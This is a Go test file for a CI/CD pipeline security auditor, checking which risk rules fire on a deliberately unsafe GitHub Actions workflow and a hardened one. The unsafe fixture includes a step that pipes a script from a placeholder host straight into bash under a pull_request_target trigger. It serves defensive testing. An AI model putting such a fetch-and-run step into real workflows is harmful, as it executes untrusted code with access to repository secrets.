package main

import "testing"

const risky = `name: ci
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl https://x.test/i.sh | bash
`

const clean = `name: ci
on:
  push:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f152de45cc393bb48ce5d89d36b731f54556e65
      - run: make build
`

func ruleSet(fs []Finding) map[string]bool {
	m := map[string]bool{}
	for _, f := range fs {
		m[f.RuleID] = true
	}
	return m
}

func TestRiskyFlagsCategories(t *testing.T) {
	rules := ruleSet(auditText(risky, ".github/workflows/ci.yml"))
	for _, want := range []string{"CICD-SEC-01", "CICD-SEC-04", "CICD-SEC-05", "CICD-SEC-07"} {
		if !rules[want] {
			t.Fatalf("missing %s in %v", want, rules)
		}
	}
}

func TestCleanHasNoHighOrCritical(t *testing.T) {
	for _, f := range auditText(clean, ".github/workflows/ci.yml") {
		if f.Severity == "high" || f.Severity == "critical" {
			t.Fatalf("unexpected severe finding: %+v", f)
		}
	}
}

func TestSHAPinNotFlagged(t *testing.T) {
	for _, f := range auditText(clean, ".github/workflows/ci.yml") {
		if f.RuleID == "CICD-SEC-04" {
			t.Fatalf("SHA-pinned action should not be flagged")
		}
	}
}

func TestVersion(t *testing.T) {
	if toolName != "PIPEWATCH-PRO" || toolVersion == "" {
		t.Fatal("bad identity")
	}
}
